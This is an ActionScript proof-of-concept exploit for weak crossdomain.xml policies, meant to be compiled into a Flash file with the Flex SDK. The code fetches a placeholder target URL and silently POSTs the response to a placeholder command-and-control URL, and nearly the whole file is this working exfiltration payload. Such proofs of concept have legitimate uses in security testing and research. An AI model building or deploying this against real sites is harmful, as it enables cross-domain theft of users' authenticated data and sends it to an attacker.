// Weak crossdomain.xml exploitation POC
// to be compile with Adobe flex sdk
//     root@kali:~/flex/bin# ./mxmlc flasher.as
// will send the reponse of the request to <target URL> to the <CC URL>
// flash is needed (in 2018 still work with IE)
// https://www.paladion.net/blogs/weak-crossdomain-xml-and-its-exploitation-poc

package{
  import flash.display.Sprite ;
  import flash.events.* ;
  import flash.net.URLRequestMethod;
  import flash.net.URLRequest ;
  import flash.net.URLLoader ;

public class flasher extends Sprite {
  public function flasher(){
    var readFrom:String = "<target URL>";
    var readRequest:URLRequest = new URLRequest (readFrom);
    var getLoader:URLLoader = new URLLoader();
    getLoader.addEventListener(Event.COMPLETE, eventHandler);
    try {
      getLoader.load(readRequest);
    } catch (error:Error){
    }
  }

  private function eventHandler (event:Event):void {
    var sendTo:String = "<CC URL>"
    var sendRequest:URLRequest = new URLRequest (sendTo);
    sendRequest.method = URLRequestMethod.POST;
    sendRequest.data = event.target.data;
    var sendLoader:URLLoader = new URLLoader();
    try {
      sendLoader.load(sendRequest);
    } catch (error:Error){
    }
  }
}
}
